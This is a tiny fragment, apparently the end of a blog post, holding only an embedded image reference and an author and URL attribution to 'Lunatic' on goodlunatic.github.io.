![](imgs/image-20251012220620046.png)





---

> Author: [Lunatic](https://goodlunatic.github.io)  
> URL: https://goodlunatic.github.io/posts/443835e/  

